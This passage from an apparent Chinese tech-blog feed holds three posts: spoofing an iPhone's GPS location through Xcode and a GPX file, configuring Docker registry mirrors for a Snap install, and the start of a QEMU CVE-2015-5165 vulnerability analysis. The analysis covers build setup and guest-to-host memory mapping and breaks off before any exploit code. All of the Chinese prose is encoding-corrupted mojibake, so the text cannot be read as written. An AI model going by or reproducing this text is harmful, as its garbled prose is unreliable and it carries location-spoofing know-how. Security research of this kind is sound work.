    <content type="html"><![CDATA[<p>æœªè¶Šç‹± iOS è®¾å¤‡é€šè¿‡ Xcode ä¿®æ”¹ GPS å®šä½ä¿¡æ¯ã€‚</p><a id="more"></a><h2 id="0x01-GPS-åæ ‡ç®€ä»‹"><a href="#0x01-GPS-åæ ‡ç®€ä»‹" class="headerlink" title="0x01. GPS åæ ‡ç®€ä»‹"></a>0x01. GPS åæ ‡ç®€ä»‹</h2><p>GPS åæ ‡ä½¿ç”¨ç»çº¬åº¦æ¥è¡¨ç¤ºï¼Œæœ‰å‡ ç§ä¸åŒçš„è§„èŒƒï¼š</p><ol><li>WGS-84ï¼ŒWorld Geodetic Systemï¼Œå®šä¹‰äº 1984 å¹´ï¼Œæœ€åä¿®æ”¹å®šäº 2004 å¹´ï¼Œæ˜¯è¢« GPS æ‰€ä½¿ç”¨çš„å›½é™…è§„èŒƒ</li><li>GCJ-02ï¼Œå›½æµ‹å±€åæ ‡ç³»ã€ç«æ˜Ÿåæ ‡ç³»ï¼ŒåŸºäº WGS-84 ä½†æ˜¯ä¼šåœ¨ç»çº¬åº¦ä¸­åŠ å…¥çœ‹ä¼¼éšæœºçš„åç§»</li><li>BD-09ï¼Œç™¾åº¦åæ ‡ç³»ï¼Œåœ¨ GCJ-02 çš„åŸºç¡€ä¸Šå¢åŠ äº†ä¸€æ¬¡å˜æ¢</li></ol><p>ã€Šä¸­åäººæ°‘å…±å’Œå›½æµ‹ç»˜æ³•ã€‹è¦æ±‚åœ°å›¾æä¾›å•†ä½¿ç”¨ GCJ-02 åæ ‡ç³»ç»Ÿï¼š</p><blockquote><p>ä½¿ç”¨ GCJ-02 è®°å½•ä¸‹çš„åœ°ç‚¹åœ¨ GCJ-02 çš„åœ°å›¾ä¸­ä¼šæ˜¾ç¤ºåœ¨æ­£ç¡®ä½ç½®ï¼Œç„¶è€Œæ¢æˆ WGS-84 çš„åœ°å›¾æˆ–åœ°ç‚¹è®°å½•å°±å¯èƒ½é€ æˆ 100 - 700 ç±³ä¸ç­‰çš„åç§»ã€‚æ®æµ‹é‡ï¼ŒGoogle.com çš„åœ°å›¾ä¸çœŸå®åæ ‡ç›¸å·®çº¦ 50 - 500 ç±³ï¼Œè€Œä¸­å›½åŒºçš„ Google.cn åœ°å›¾åˆ™ä¸å«æ˜Ÿå›¾æ— åå·®</p></blockquote><p>å®é™…æµ‹è¯•å‘ç° Google.cn è¿ç§»åˆ° Google.com.hk ä¹‹åï¼Œä½¿ç”¨çš„æ˜¯ WGS-84 åæ ‡ç³»ï¼Œå…¶å«æ˜Ÿå›¾ä¸åœ°å›¾å­˜åœ¨ä¸€å®šçš„åç§»ï¼š</p><p><img src="/uploads/202105/google-maps.jpg" alt="ç«æ˜Ÿåæ ‡ç³»åç§»"></p><h2 id="0x02-Xcode-çœŸæœºè°ƒè¯•"><a href="#0x02-Xcode-çœŸæœºè°ƒè¯•" class="headerlink" title="0x02. Xcode çœŸæœºè°ƒè¯•"></a>0x02. Xcode çœŸæœºè°ƒè¯•</h2><p>åœ¨ Xcode ä¸­æ–°å»ºä¸€ä¸ª iOS Appï¼Œå¹¶åœ¨ iOS Deployment Target è®¾ç½®å¥½å¯¹åº”çš„ç³»ç»Ÿç‰ˆæœ¬ã€‚</p><p><img src="/uploads/202105/ios-deployment-target.jpg" alt="iOS Deployment Target è®¾ç½®"></p><p>é¦–æ¬¡åœ¨ iPhone ä¸Šè°ƒè¯•ï¼Œä¼šæç¤ºå¦‚ä¸‹é”™è¯¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Could not launch â€œPhoneDemoâ€</span><br><span class="line">Domain: IDEDebugSessionErrorDomain</span><br><span class="line">Code: 3</span><br><span class="line">Failure Reason: Security</span><br><span class="line">User Info: &#123;</span><br><span class="line">    DVTRadarComponentKey = 855031;</span><br><span class="line">    RawUnderlyingErrorMessage = Security;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/uploads/202105/ide-debug-session-error-domain-security.jpg" alt="DVTRadarComponentKey=855031 RawUnderlyingErrorMessage=Security"></p><p>åœ¨ iPhone çš„è®¾ç½®é‡Œé¢ä¿¡ä»»å¯¹åº”çš„å¼€å‘è€…å³å¯ã€‚</p><h2 id="0x03-GPS-ä½ç½®æ¨¡æ‹Ÿ"><a href="#0x03-GPS-ä½ç½®æ¨¡æ‹Ÿ" class="headerlink" title="0x03. GPS ä½ç½®æ¨¡æ‹Ÿ"></a>0x03. GPS ä½ç½®æ¨¡æ‹Ÿ</h2><ol><li>é€šè¿‡ <a href="https://lbs.amap.com/tools/picker" target="_blank" rel="noopener">é«˜å¾·åœ°å›¾ API</a> è·å–ç›®æ ‡ä½ç½®çš„ GCJ-02 åæ ‡ï¼Œæ¯”å¦‚â€œæ·±åœ³å¸‚è…¾è®¯å¤§å¦â€çš„åæ ‡ä¸º <code>113.934497,22.540517</code></li><li>é€šè¿‡ <a href="http://www.dituwa.com/tool/gpxaxes" target="_blank" rel="noopener">è½¬æ¢å·¥å…·</a> å°†åæ ‡è½¬æ¢ä¸º WGS-84 åæ ‡ï¼Œè¿™é‡Œè½¬æ¢åä¸º <code>113.92962958,22.54354674</code></li><li>åœ¨ iOS App å·¥ç¨‹ä¸­æ–°å»ºä¸€ä¸ª location.gpx æ–‡ä»¶å¹¶è®¾ç½®å¥½ WGS-84 ç»çº¬åº¦åæ ‡</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;gpx version=&quot;1.1&quot;</span><br><span class="line">    creator=&quot;GMapToGPX 6.4j - http://www.elsewhere.org/GMapToGPX/&quot;</span><br><span class="line">    xmlns=&quot;http://www.topografix.com/GPX/1/1&quot;</span><br><span class="line">    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">    xsi:schemaLocation=&quot;http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd&quot;&gt;</span><br><span class="line">    &lt;wpt lat=&quot;22.54354674&quot; lon=&quot;113.92962958&quot;&gt;</span><br><span class="line">    &lt;/wpt&gt;</span><br><span class="line">&lt;/gpx&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œéœ€è¦ä¿®æ”¹ iOS App å·¥ç¨‹è®¾ç½®ï¼Œé€‰æ‹© <code>Edit Scheme...</code>ï¼Œåœ¨ Run - Options - Core Location ä¸­é€‰ä¸­ Allow Location Simulationï¼Œå…¶ä¸­ Default Location é€‰ä¸­å‰é¢æ·»åŠ çš„ gpx æ–‡ä»¶ã€‚</p><p><img src="/uploads/202105/ios-location-simulation.jpg" alt=""></p><p>åœ¨è¿æ¥çš„ iPhone ä¸Šè¿è¡Œè¯¥ iOS Appï¼Œå³å¯ä¸´æ—¶ä¿®æ”¹ GPS ä½ç½®ä¿¡æ¯ã€‚</p><p><img src="/uploads/202105/shenzhen-tencent-building.jpg" alt="æ·±åœ³å¸‚è…¾è®¯å¤§å¦"></p><p>å½“ç„¶ï¼Œè¿™ç§æ¨¡æ‹Ÿ GPS ä½ç½®çš„æ–¹æ³•å¼Šç«¯ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä¹‹å‰çœ‹åˆ°æœ‰äººåœ¨ HITB ä¸Šè®²è¿‡ <a href="https://cyberweek.ae/materials/2020/COMMSEC%20D2%20-%20Spoofing%20Your%20Location%20on%20iOS%20without%20Jailbreaking.pdf" target="_blank" rel="noopener">PhantomGPS</a>ï¼Œç›¸å¯¹æ¥è¯´æ–¹ä¾¿å’Œçµæ´»äº†å¾ˆå¤šï¼ŒäºŒä»£å”®ä»· 400 å—ã€‚</p><h2 id="0x04-å‚è€ƒæ–‡æ¡£"><a href="#0x04-å‚è€ƒæ–‡æ¡£" class="headerlink" title="0x04. å‚è€ƒæ–‡æ¡£"></a>0x04. å‚è€ƒæ–‡æ¡£</h2><ol><li><a href="https://zh.wikipedia.org/wiki/%E4%B8%96%E7%95%8C%E5%A4%A7%E5%9C%B0%E6%B5%8B%E9%87%8F%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">World Geodetic System - Wikipedia</a></li><li><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%9C%B0%E7%90%86%E6%95%B0%E6%8D%AE%E9%99%90%E5%88%B6#GCJ-02" target="_blank" rel="noopener">GCJ-02 - Wikipedia</a></li><li><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%9C%B0%E7%90%86%E6%95%B0%E6%8D%AE%E9%99%90%E5%88%B6#BD-09" target="_blank" rel="noopener">BD-09 - Wikipedia</a></li><li><a href="https://steppark.net/15294912961206.html" target="_blank" rel="noopener">å¦™ç”¨ Xcode ä¿®æ”¹ iPhone çš„å½“å‰å®šä½ä½ç½®</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœªè¶Šç‹± iOS è®¾å¤‡é€šè¿‡ Xcode ä¿®æ”¹ GPS å®šä½ä¿¡æ¯ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Apple" scheme="http://programlife.net/categories/Apple/"/>
    
      <category term="iOS" scheme="http://programlife.net/categories/Apple/iOS/"/>
    
    
      <category term="iOS" scheme="http://programlife.net/tags/iOS/"/>
    
      <category term="GPS" scheme="http://programlife.net/tags/GPS/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu Snap Docker å›½å†…åŠ é€Ÿé•œåƒè®¾ç½®</title>
    <link href="http://programlife.net/2020/09/12/ubuntu-snap-docker-registry-mirrors/"/>
    <id>http://programlife.net/2020/09/12/ubuntu-snap-docker-registry-mirrors/</id>
    <published>2020-09-12T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸º Ubuntu ä¸‹é€šè¿‡ Snap å®‰è£…çš„ Docker è®¾ç½®å›½å†…åŠ é€Ÿé•œåƒï¼ˆRegistry Mirrorsï¼‰ã€‚</p><a id="more"></a><p>å…³äº Ubuntu ä¸‹ Docker å›½å†…åŠ é€Ÿé•œåƒçš„è®¾ç½®ï¼Œç›®å‰æœç´¢å¼•æ“èƒ½æœåˆ°çš„æ–‡ç« å¤§éƒ¨åˆ†éƒ½æ˜¯é’ˆå¯¹ apt å®‰è£…çš„ Docker çš„ï¼Œä¸»è¦é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ <code>/etc/docker/daemon.json</code> æ·»åŠ å›½å†…åŠ é€Ÿé•œåƒåœ°å€ï¼ˆä»¥ä¸­ç§‘å¤§ä¸ºä¾‹ï¼‰ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"registry-mirrors"</span>: [<span class="string">"https://docker.mirrors.ustc.edu.cn/"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸å…³åŠ é€Ÿé•œåƒè¿˜æœ‰ï¼š</p><ol><li>Docker å®˜æ–¹é•œåƒ <code>https://registry.docker-cn.com</code></li><li>ç½‘æ˜“é•œåƒ <code>https://hub-mirror.c.163.com</code></li><li>è…¾è®¯é•œåƒ <code>https://mirror.ccs.tencentyun.com</code></li><li>ä¸ƒç‰›é•œåƒ <code>https://reg-mirror.qiniu.com</code></li><li>é˜¿é‡Œäº‘é•œåƒï¼ˆéœ€è¦æ³¨å†Œç™»é™†ï¼Œæ— å…¬å¼€åœ°å€ï¼‰</li></ol><p>ç›®å‰æœ€æ–°çš„ Ubuntu 20.04 ä½¿ç”¨ snap å®‰è£… Docker éå¸¸æ–¹ä¾¿ï¼Œä¸éœ€è¦ä¿®æ”¹æºçš„è®¾ç½®ï¼Œç›´æ¥ä¸€æ¡å‘½ä»¤å³å¯å®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo snap install docker</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸Šè¿°å›½å†…åŠ é€Ÿé•œåƒçš„è®¾ç½®æ–¹æ³•å¯¹é€šè¿‡ snap å®‰è£…çš„ Docker æ— æ•ˆï¼é€šè¿‡ snap å®‰è£…çš„ Docker çš„é…ç½®æ–‡ä»¶ä½äº <code>/var/snap/docker/current/config/daemon.json</code> ï¼Œå¾€å…¶ä¸­æ·»åŠ åŠ é€Ÿé•œåƒçš„è®¾ç½®å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cat /var/snap/docker/current/config/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">    "log-level":        "error",</span><br><span class="line">    "storage-driver":   "overlay2",</span><br><span class="line">    "registry-mirrors": ["https://hub-mirror.c.163.com"]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¾ç½®å¥½ä¹‹åé€šè¿‡ snap é‡å¯ Docker æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo snap restart docker</span><br></pre></td></tr></table></figure><p>é€šè¿‡ <code>docker info</code> å‘½ä»¤æ£€æŸ¥è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆï¼ˆè§‚å¯Ÿ <strong>Registry Mirrors</strong> å­—æ®µï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Registry: https://index.docker.io/v1/</span><br><span class="line">Labels:</span><br><span class="line">Experimental: false</span><br><span class="line">Insecure Registries:</span><br><span class="line"> 127.0.0.0/8</span><br><span class="line">Registry Mirrors:</span><br><span class="line"> https://hub-mirror.c.163.com/</span><br><span class="line">Live Restore Enabled: false</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸º Ubuntu ä¸‹é€šè¿‡ Snap å®‰è£…çš„ Docker è®¾ç½®å›½å†…åŠ é€Ÿé•œåƒï¼ˆRegistry Mirrorsï¼‰ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="Docker" scheme="http://programlife.net/categories/Virtualization/Docker/"/>
    
    
      <category term="Ubuntu" scheme="http://programlife.net/tags/Ubuntu/"/>
    
      <category term="Snap" scheme="http://programlife.net/tags/Snap/"/>
    
      <category term="Docker" scheme="http://programlife.net/tags/Docker/"/>
    
      <category term="daemon.json" scheme="http://programlife.net/tags/daemon-json/"/>
    
  </entry>
  
  <entry>
    <title>QEMU ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2015-5165 åˆ†æåŠåˆ©ç”¨</title>
    <link href="http://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/"/>
    <id>http://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/</id>
    <published>2020-06-30T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒ Phrack æ–‡ç«  <strong><em>VM escape - QEMU Case Study</em></strong> [1] å¯¹ QEMU ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2015-5165 å’Œå †æº¢å‡ºæ¼æ´ CVE-2015-7504 è¿›è¡Œè°ƒè¯•åˆ†æå¹¶ç¼–å†™ Exploit ä»£ç ï¼Œæœ¬æ–‡ä¸»è¦åˆ†æå…¶ä¸­çš„ RTL8139 ç½‘å¡ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2015-5165ã€‚</p><a id="more"></a><h2 id="0x01-ç¯å¢ƒæ­å»º"><a href="#0x01-ç¯å¢ƒæ­å»º" class="headerlink" title="0x01. ç¯å¢ƒæ­å»º"></a>0x01. ç¯å¢ƒæ­å»º</h2><h3 id="1-1-å®¿ä¸»æœºåˆ›å»º"><a href="#1-1-å®¿ä¸»æœºåˆ›å»º" class="headerlink" title="1.1 å®¿ä¸»æœºåˆ›å»º"></a>1.1 å®¿ä¸»æœºåˆ›å»º</h3><p>åœ¨ VMware Workstation ä¸­åˆ›å»º Ubuntu 20.04 è™šæ‹Ÿæœºï¼Œå¹¶ä¸ºè™šæ‹Ÿæœºçš„ CPU å¼€å¯è™šæ‹ŸåŒ–å¼•æ“ç›¸å…³é€‰é¡¹ï¼Œä½¿ä¹‹æ”¯æŒåµŒå¥—è™šæ‹ŸåŒ–ï¼Œä»¥ä¾¿å¯¹ QEMU è¿›è¡Œè°ƒè¯•åˆ†æã€‚</p><p>å®‰è£…å¥½ Ubuntu ä¹‹åï¼Œå¯ä»¥å…ˆå°†æºè®¾ç½®ä¸ºå›½å†…çš„å¼€æºé•œåƒç½‘ç«™ï¼Œä¹‹åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æ›´æ–°ç³»ç»Ÿç»„ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get upgrade</span></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ QEMU éœ€è¦ Python 2ï¼Œå› ä¸º Ubuntu 20.04 ä¸­åªæœ‰ Python 3ï¼Œæ‰€ä»¥éœ€è¦è‡ªè¡Œå®‰è£… Python 2ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install python2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/bin/python2 /usr/bin/python</span></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ QEMU æ‰€ä¾èµ–çš„å…¶ä»–åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev</span></span><br></pre></td></tr></table></figure><h3 id="1-2-QEMU-ç¼–è¯‘"><a href="#1-2-QEMU-ç¼–è¯‘" class="headerlink" title="1.2 QEMU ç¼–è¯‘"></a>1.2 QEMU ç¼–è¯‘</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git://git.qemu-project.org/qemu.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> qemu</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout bd80b59</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir -p bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ../../../configure --target-list=x86_64-softmmu \</span></span><br><span class="line">    --enable-debug --disable-werror</span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure><p>å¦‚æœå‡ºç°ä»¥ä¸‹é”™è¯¯ï¼Œç»™æ–‡ä»¶ <code>commands-posix.c</code> å¢åŠ å¤´æ–‡ä»¶ <code>&lt;sys/sysmacros.h&gt;</code> å³å¯è§£å†³ [2]ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor':</span><br><span class="line">/repo/qemu/qga/commands-posix.c:640: undefined reference to `major'</span><br><span class="line">/usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor'</span><br></pre></td></tr></table></figure><h3 id="1-3-è™šæ‹Ÿæœºåˆ›å»º"><a href="#1-3-è™šæ‹Ÿæœºåˆ›å»º" class="headerlink" title="1.3 è™šæ‹Ÿæœºåˆ›å»º"></a>1.3 è™šæ‹Ÿæœºåˆ›å»º</h3><p>QEMU ç¼–è¯‘å®Œæˆä¹‹åï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªç”¨äºè°ƒè¯•æ¼æ´çš„è™šæ‹Ÿæœºã€‚ä¸ºäº†è°ƒè¯•æ–¹ä¾¿ï¼Œè¿™é‡Œå®‰è£… Ubuntu 20.04 Server ç‰ˆæœ¬ï¼ˆæ¯”è¾ƒæ–°çš„ Ubuntu Server æ²¡æœ‰ 32 ä½çš„ç‰ˆæœ¬ï¼Œä½†è¿™é‡Œå»ºè®®å®‰è£…ä¸€ä¸ª 32 ä½çš„ç³»ç»Ÿï¼Œå› ä¸ºåé¢çš„ PoC å’Œ Exploit éƒ½æ˜¯é’ˆå¯¹ 32 ä½ç¯å¢ƒç¼–å†™çš„ï¼‰ï¼Œç›¸å…³å‘½ä»¤å¦‚ä¸‹æ‰€ç¤º [3]ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./qemu-img create -f qcow2 ~/Desktop/vm/ubuntu.img 10G</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -boot d -cdrom \</span></span><br><span class="line">    /mnt/hgfs/share/ubuntu-20.04-live-server-amd64.iso \</span><br><span class="line">    -hda ~/Desktop/vm/ubuntu.img -m 1024</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜éœ€è¦å®‰è£…ä¸€ä¸ª VNC Viewer [4]ï¼Œä»¥ä¾¿è¿œç¨‹è®¿é—®è™šæ‹Ÿæœºï¼Œä¸‹è½½ deb å®‰è£…åŒ…åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå°±å¯ä»¥é€šè¿‡ VNC Viewer æ¥è®¿é—®è™šæ‹Ÿæœºäº†ã€‚</p><h2 id="0x02-å†…å­˜æ˜ å°„"><a href="#0x02-å†…å­˜æ˜ å°„" class="headerlink" title="0x02. å†…å­˜æ˜ å°„"></a>0x02. å†…å­˜æ˜ å°„</h2><p>å’Œ Host æ“ä½œç³»ç»Ÿä¸€æ ·ï¼ŒGuest æ“ä½œç³»ç»Ÿä¸­çš„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œè¿™é‡Œç§°ä¹‹ä¸º Guest Virtual Addressï¼Œå³ GVAï¼›é€šè¿‡è¿›ç¨‹è‡ªèº«çš„é¡µè¡¨ï¼ˆPage Tableï¼‰ï¼ŒGuest æ“ä½œç³»ç»Ÿå¯ä»¥å°† GVA è½¬æ¢ä¸ºå¯¹åº”çš„ GPAï¼ˆGuest Physical Addressï¼‰ã€‚</p><p>Guest æ“ä½œç³»ç»Ÿçš„ GPAï¼Œå®é™…ä¸Šæ˜¯å¯¹åº”çš„ QEMU è¿›ç¨‹ä¸­æ˜ å°„çš„è™šæ‹Ÿå†…å­˜ï¼Œå³ HVAï¼ˆHost Virtual Addressï¼‰ï¼›Host æ“ä½œç³»ç»ŸåŒæ ·é€šè¿‡å¯¹åº”è¿›ç¨‹çš„é¡µè¡¨ï¼Œæœ€ç»ˆå°†å…¶è½¬æ¢ä¸ºå¯¹åº”çš„ HPAï¼ˆHost Physical Addressï¼‰ã€‚</p><p>å¾… Ubuntu Server è™šæ‹Ÿæœºå®‰è£…å®Œæ¯•åï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¯åŠ¨è¯¥è™šæ‹Ÿæœºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -m 2048 -drive \</span></span><br><span class="line">    file=~/Desktop/vm/ubuntu.img,format=qcow2,if=ide,cache=writeback</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»™è™šæ‹Ÿæœºåˆ†é…äº† 2GB çš„å†…å­˜ï¼Œå¯ä»¥åœ¨å¯¹åº”çš„ QEMU è¿›ç¨‹ä¸­æ‰¾åˆ°å¯¹åº”çš„è™šæ‹Ÿå†…å­˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -e|grep qemu</span></span><br><span class="line">   4407 pts/1    00:01:14 qemu-system-x86</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /proc/4407/maps</span></span><br><span class="line">......</span><br><span class="line">7fe880021000-7fe884000000 ---p 00000000 00:00 0 </span><br><span class="line">7fe884000000-7fe904000000 rw-p 00000000 00:00 0         [2GB RAM]</span><br><span class="line">7fe904000000-7fe90465d000 rw-p 00000000 00:00 0 </span><br><span class="line">......</span><br><span class="line">7ffc9f4a1000-7ffc9f4c2000 rw-p 00000000 00:00 0         [stack]</span><br><span class="line">7ffc9f4fd000-7ffc9f500000 r--p 00000000 00:00 0         [vvar]</span><br><span class="line">7ffc9f500000-7ffc9f501000 r-xp 00000000 00:00 0         [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall]</span><br></pre></td></tr></table></figure><p>å…³äº Guest Virtual Address åˆ° Host Virtual Address çš„è½¬æ¢ï¼ŒPhrack çš„æ–‡ç« æ²¡æ€ä¹ˆè§£é‡Šï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°å¦ä¸€ç¯‡æ–‡ç«  [5] è§£é‡Šçš„æ¯”è¾ƒæ¸…æ¥šï¼ˆä»¥ 64 ä½ç³»ç»Ÿä¸ºä¾‹ï¼‰ï¼š</p><ol><li><p>æ¯ä¸ªé¡µé¢çš„å¤§å°ä¸º <code>4096</code> å­—èŠ‚ï¼Œå³ <code>1 &lt;&lt; 12</code> ï¼›</p></li><li><p>åŸºäº <code>/proc/pid/pagemap</code> å¯ä»¥æŸ¥çœ‹è¿›ç¨‹ä»»æ„ Virtual Page çš„çŠ¶æ€ï¼ŒåŒ…æ‹¬æ˜¯å¦è¢«æ˜ å°„åˆ°ç‰©ç†å†…å­˜ä»¥åŠåœ¨ç‰©ç†å†…å­˜ä¸­çš„ Page Frame Numberï¼ˆPFNï¼‰ç­‰ï¼›</p><ul><li><code>pagemap</code> æ–‡ä»¶ä¸ºæ¯ä¸ª Virtual Page å­˜å‚¨ <code>64</code> ä½ï¼ˆå³ <code>8</code> å­—èŠ‚ï¼‰çš„ä¿¡æ¯ï¼Œæ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š</li></ul></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Bits 0-54  page frame number (PFN) if present</span><br><span class="line">Bits 0-4   swap type if swapped</span><br><span class="line">Bits 5-54  swap offset if swapped</span><br><span class="line">Bit  55    pte is soft-dirty</span><br><span class="line">Bit  56    page exclusively mapped (since 4.2)</span><br><span class="line">Bits 57-60 zero</span><br><span class="line">Bit  61    page is file-page or shared-anon (since 3.5)</span><br><span class="line">Bit  62    page swapped</span><br><span class="line">Bit  63    page present</span><br></pre></td></tr></table></figure><ol start="3"><li><p>å¯¹ä»»æ„çš„è™šæ‹Ÿåœ°å€ <code>address</code> ï¼ŒåŸºäº <code>address / 4096</code> 